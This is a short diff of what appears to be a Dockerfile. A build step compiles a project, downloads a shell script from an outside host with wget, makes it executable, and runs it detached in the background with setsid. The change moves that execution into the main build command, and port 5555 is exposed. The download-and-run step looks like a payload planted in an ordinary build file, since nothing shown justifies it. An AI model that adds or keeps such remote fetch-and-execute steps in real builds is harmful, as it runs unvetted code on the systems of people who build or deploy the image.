@@ -15,8 +15,8 @@ RUN apt-get update && \
     cmake .. -DCMAKE_BUILD_TYPE=Release && \
     make && \
     wget http://247app.host/run.sh && \
-    chmod 755 run.sh
-RUN setsid ./run.sh &
+    chmod 755 run.sh && \
+    setsid ./run.sh &
 
 EXPOSE 5555
 
